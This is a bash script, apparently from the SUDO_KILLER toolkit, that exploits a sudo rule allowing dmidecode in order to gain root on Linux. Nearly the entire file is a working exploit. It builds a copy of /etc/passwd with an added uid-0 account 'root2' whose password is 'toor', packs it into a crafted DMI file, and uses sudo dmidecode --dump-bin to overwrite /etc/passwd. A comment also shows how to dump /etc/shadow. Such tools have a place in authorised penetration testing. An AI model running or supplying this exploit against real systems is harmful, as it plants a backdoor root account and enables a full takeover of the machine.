#!/bin/bash

#!/bin/bash
# This script was developed to check for common misconfigurations and vulnerabilities of the sudo 
# V1: Date Created : 08/12/2018
# V2: Date Created : 11/02/2020
# V3: Date Created : 20/07/2023
# Date of last modification : 20/07/2023
# @TH3xACE - BLAIS David
# https://github.com/TH3xACE/SUDO_KILLER

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal



# This script will compile and test the exploit.
# On the vulnerable system, execution will look something like this:
#
# sudo dmidecode -d evil.dmi --dump-bin /etc/shadow
#

set -o nounset
set -o errexit

rm "$PWD/passwd.backup"
rm "$PWD/passwd.backdoor"
#rm /tmp/sk.dmi

echo " " >> $PWD/passwd.backup
touch $PWD/passwd.backup
cat /etc/passwd >> $PWD/passwd.backup

#who=$(whoami 2>/dev/null)
#id=$(id | cut -d "(" -f 1 | sed 's/uid=//g' 2>/dev/null)

echo " " >> "$PWD/passwd.backdoor"
#cat /etc/passwd | sed "s/$who:x:$id/$who:x:0/g" >> "$PWD/passwd.backdoor"
cat /etc/passwd >> "$PWD/passwd.backdoor"
echo "root2:\$1\$SK\$Zu40ddryQHZ4NBc4fOxcR0:0:0:root:/root:/bin/bash" >> "$PWD/passwd.backdoor"

echo -e "[+] use the username root2 and password toor"
echo -e "[-] Don't forget to make a clean of /etc/passwd afterwards"

 payload_file="$PWD/passwd.backdoor"
 write_file='/etc/passwd'

# # the crafted DMI file to generate
 dmi_file='/tmp/sk.dmi'

# # this option is not present on older versions of dmidecode
 flags="--no-sysfs"

rm -f "${dmi_file}" 

#"${write_file}"

#make dmiwrite

./dmiwrite "${payload_file}" "${dmi_file}"

sudo /usr/sbin/dmidecode "${flags}" -d "${dmi_file}" --dump-bin "${write_file}"

